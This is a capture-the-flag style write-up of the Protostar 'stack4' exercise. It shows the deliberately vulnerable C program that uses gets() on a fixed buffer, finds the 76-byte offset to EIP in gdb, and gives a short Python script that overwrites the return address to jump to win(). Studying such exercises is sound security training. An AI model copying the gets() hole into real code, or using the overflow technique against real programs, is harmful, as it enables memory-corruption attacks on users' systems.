# Stack4 Challenge

This challenge is a small variation of the previous one, only in this case we have no function pointer. Therefore, in order to call `win()` we have to alter the **Instruction pointer**.

You can find the source code here <a href="https://exploit-exercises.lains.space/protostar/stack4/">here</a>.

```c

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

**Disassembled**

<img src="https://github.com/astasinos/Writeups/blob/master/Binary%20Exploitation%20%26%20Reverse%20Engineering/protostar/stack4/images/disas_st4.png">

Let's create a random pattern so we can identify when our instruction pointer is overwritten. Visit https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html so you can quickly generate a pattern and copy it.

<img src="https://github.com/astasinos/Writeups/blob/master/Binary%20Exploitation%20%26%20Reverse%20Engineering/protostar/stack4/images/pattern.png">

Now open the program in gdb and run it giving as input the pattern generated from the above link.

<img src="https://github.com/astasinos/Writeups/blob/master/Binary%20Exploitation%20%26%20Reverse%20Engineering/protostar/stack4/images/inputpattern.png">

We can see that **eip** was overwritten with **0x63413563**.
We can find that this corresponds to ASCII **_c5Ac_**

<img src="https://github.com/astasinos/Writeups/blob/master/Binary%20Exploitation%20%26%20Reverse%20Engineering/protostar/stack4/images/pyres.png">

List in python is backwards because of **Little-Endian** format.

Revisiting the pattern page and inputting **c5Ac** we find that the offset needed to reach **EIP** is **76** bytes.

<!-- findpatterofsset -->

So let's once again find where `win()` is 

<img src="https://github.com/astasinos/Writeups/blob/master/Binary%20Exploitation%20%26%20Reverse%20Engineering/protostar/stack4/images/winloc.png">

Then simply create the below python script to redirect execution flow to `win()`

```python
#!/usr/bin/env python
from struct import pack
prepend = b"A"  * 76
prepend += pack("<L",0x80483f4)
print prepend
```

Exploit

<!-- confbehaviout -->

### Success!
